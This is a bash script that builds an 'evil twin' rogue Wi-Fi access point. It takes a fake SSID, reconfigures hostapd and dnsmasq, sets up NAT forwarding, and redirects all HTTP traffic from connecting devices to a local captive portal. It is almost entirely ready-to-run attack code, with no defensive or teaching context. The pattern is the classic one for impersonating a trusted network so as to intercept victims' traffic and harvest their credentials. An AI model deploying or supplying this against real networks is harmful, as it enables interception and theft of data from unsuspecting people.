#!/bin/bash
set -e

# === Ensure necessary tools are installed ===
#sudo apt update
#sudo apt install -y iw net-tools iproute2 hostapd dnsmasq iptables

# === Auto-detect Interfaces ===
WIFI_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
INTERNET_IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -n1)

# Fallback: ask user if auto-detect fails
if [ -z "$WIFI_IFACE" ]; then
    read -p "Enter your WiFi interface (e.g., wlan0, wlp2s0): " WIFI_IFACE
fi

if [ -z "$INTERNET_IFACE" ]; then
    read -p "Enter your Internet interface (e.g., eth0, enp0s3): " INTERNET_IFACE
fi

# === Ask user for Fake SSID ===
read -p "Enter SSID for Fake WiFi: " FAKE_SSID

# === Backup original SSID if not already saved ===
if [ ! -f ".evil_twin.conf" ]; then
    ORIG_SSID=$(grep '^ssid=' hostapd.conf | cut -d= -f2)
else
    source .evil_twin.conf
fi

# Update hostapd.conf dynamically
# sed -i "s/^ssid=.*/ssid=$FAKE_SSID/" hostapd.conf
# Update hostapd.conf dynamically
sed -i "s/^ssid=.*/ssid=$FAKE_SSID/" hostapd.conf
sed -i "s/^interface=.*/interface=$WIFI_IFACE/" hostapd.conf

# Update dnsmasq.conf dynamically
sed -i "s/^interface=.*/interface=$WIFI_IFACE/" dnsmasq.conf

# Save config for stop.sh
echo "WIFI_IFACE=$WIFI_IFACE" > .evil_twin.conf
echo "INTERNET_IFACE=$INTERNET_IFACE" >> .evil_twin.conf
echo "ORIG_SSID=$ORIG_SSID" >> .evil_twin.conf

# === Kill old processes ===
sudo pkill hostapd 2>/dev/null || true
sudo pkill dnsmasq 2>/dev/null || true

echo "[*] Setting static IP on $WIFI_IFACE..."
sudo ifconfig $WIFI_IFACE 192.168.50.1 netmask 255.255.255.0 up

echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo "[*] Flushing old iptables rules..."
sudo iptables -F
sudo iptables -t nat -F

echo "[*] Preparing hostapd control socket..."
sudo mkdir -p /var/run/hostapd
sudo chown root:root /var/run/hostapd

echo "[*] Starting hostapd..."
sudo hostapd -B hostapd.conf

echo "[*] Starting dnsmasq..."
sudo dnsmasq -C dnsmasq.conf

echo "[*] Setting up NAT and forwarding rules..."
sudo iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
sudo iptables -A FORWARD -i $WIFI_IFACE -o $INTERNET_IFACE -j ACCEPT
sudo iptables -A FORWARD -i $INTERNET_IFACE -o $WIFI_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -t nat -A PREROUTING -i $WIFI_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80

echo ""
echo "[*] Captive Portal started successfully!"
echo "   🔹 Fake SSID     : $FAKE_SSID"
echo "   🔹 WiFi iface    : $WIFI_IFACE"
echo "   🔹 Internet iface: $INTERNET_IFACE"
echo "   🔹 Portal IP     : 192.168.50.1"

